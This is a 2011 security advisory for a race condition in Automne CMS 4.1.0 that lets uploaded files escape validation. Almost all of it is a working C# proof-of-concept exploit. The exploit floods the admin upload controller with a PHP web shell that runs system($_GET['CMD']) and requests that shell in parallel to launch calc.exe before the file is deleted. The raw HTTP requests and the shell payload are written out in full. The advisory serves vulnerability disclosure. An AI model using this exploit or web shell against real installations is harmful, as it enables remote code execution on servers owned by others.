Home Software Services Advisories Contact
Automne 4.1.0 Race Condition

// ------------------------------------------------------------------------
// Software................Automne 4.1.0
// Vulnerability...........Race Condition
// Threat Level............Very Critical (5/5)
// Download................http://en.automne-cms.org/
// Release Date............3/6/2011
// Tested On...............Windows Vista + XAMPP
// ------------------------------------------------------------------------
// Author..................AutoSec Tools
// Site....................http://www.autosectools.com/
// Email...................John Leitch <john@autosectools.com>
// ........................Bryce Darling <bryce@autosectools.com>
// ------------------------------------------------------------------------
// 
// 
// --Description--
// 
// A race condition in Automne 4.1.0 can be exploited to bypass
// validation performed on uploaded files. The following proof of concept
// uploads a PHP script and then attempts to execute it before it is deleted.
// 
// 
// --PoC--

using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Net.Sockets;

namespace RaceConditionExploit
{
    class Program
    {
        static bool trying = true;

        static void SendReq(string req)
        {
            try
            {
                var bytes = ASCIIEncoding.ASCII.GetBytes(req);
                var client = new TcpClient();
                client.Connect("localhost", 80);
                using (var stream = client.GetStream())
                    stream.Write(bytes, 0, bytes.Length);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        static void CheckForCalc()
        {
            if (Process.GetProcessesByName("calc").Length != 0)
                trying = false;
        }

        static void Main()
        {
            

            var resets = new[]
            {
                new ManualResetEvent(false),
                new ManualResetEvent(false),
                new ManualResetEvent(false),
            };

            ThreadPool.QueueUserWorkItem(x =>
            {
                resets[0].WaitOne();

                while (trying)
                {
                    SendReq(@"POST /automne/automne/admin/upload-controler.php?atm-regen=shell.php HTTP/1.1
Host: localhost
Proxy-Connection: keep-alive
User-Agent: x
Content-Length: 193
Cache-Control: max-age=0
Origin: null
Content-Type: multipart/form-data; boundary=----x
Accept: text/html
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3

------x
Content-Disposition: form-data; name=""Filedata""; filename=""shell.php""
Content-Type: application/octet-stream

<?php echo '<pre>' + system($_GET['CMD']) + '</pre>'; ?>
------x--

");
                    CheckForCalc();                    
                }
                resets[1].Set();
            });

            ThreadPool.QueueUserWorkItem(x =>
            {
                resets[0].WaitOne();

                while (trying)
                {
                    SendReq(@"GET http://localhost/automne/automne/upload/shell.php?CMD=calc.exe HTTP/1.1
Host: localhost
Connection: keep-alive
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.119 Safari/534.16
Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
Cookie: PHPSESSID=poiued4lsn8im03kb80t6131n3; osclass=9aae23cu0mqtopjv126loiu9n6; AutomneSession=mo70c3rth2qboupjpfbo010gv0

");
                    CheckForCalc();
                }

                resets[2].Set();
            });

            resets[0].Set();

            resets[1].WaitOne();
            resets[2].WaitOne();
        }
    }
}

